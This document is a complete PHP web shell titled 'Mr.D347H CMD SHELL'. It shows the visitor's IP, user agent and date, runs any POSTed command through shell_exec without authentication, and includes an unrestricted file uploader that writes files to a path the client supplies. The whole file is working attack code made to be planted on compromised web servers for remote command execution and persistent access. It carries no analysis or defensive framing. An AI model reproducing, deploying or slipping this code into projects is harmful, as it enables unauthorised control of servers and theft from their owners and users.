<?php
error_reporting(0);
$ip = $_SERVER['REMOTE_ADDR'];
$useragent = $_SERVER['HTTP_USER_AGENT'];
$date = date('m/d/y g:s:i');
$domain = gethostbyname(' ');
?>
<style>
  table {
  font-family: arial, sans-serif;
  border-collapse: collapse;
  width: 100%;
  color: yellow;
}

td, th {
  border:1px solid #dddddd;
  text-align:left;
  padding:8px;
}

tr:nth-child(even) {
  background-color:none;
}
</style>
<table><tr>
  <th>UserIp:</th>
  <th><?= print $ip;?></th>
</tr>
<tr>
  <td>UserAgent;</td>
  <td><?= print $useragent;?></td>
</tr>
<tr>
  <td>Date:</td>
  <td><?= print $date;?></td>
</tr>
</table>
<?php
 if(isset($_POST['cmd']))
 {
   $cmd = $_POST['cmd'];
   $exec = shell_exec($cmd);
   $path = @getcwd();
   $result = "<font color=yellow>Path:$path</font><br><br>Result:<br><b><font color=yellow size=5><b>$exec</b></font>";
 }
 echo "
 <body style=color:white;background:black;>
 <form method=post>
 <center>
 <b><font color=red size=8>Mr.D347H <br></font><font color=yellow>CMD SHELL</font></b><br>
 <b><font color=Yellow size=4>Command:</font></b><input type=text name=cmd style=border-radius:20px;><input type=submit value=Submit>
 </center>
 <br><pre><b>".$result."</b></pre>
 </form>
 </body>"
?>
<?php
$files = @$_FILES["files"];
if ($files["name"] != '') {
    $fullpath = $_REQUEST["path"] . $files["name"];
    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
        echo "<h1><a href='$fullpath'><center>UPLOADED!</a></h1>";
    }
}echo '<html><head><title>CMD SHELL</title></head><body><center><form method=POST enctype="multipart/form-data" action=""><input type=hidden name=path><b><font color=white size=5>Uploader::<label><input type="file" name="files"></label><input type=submit value="Up"></form></body></html>';
?>
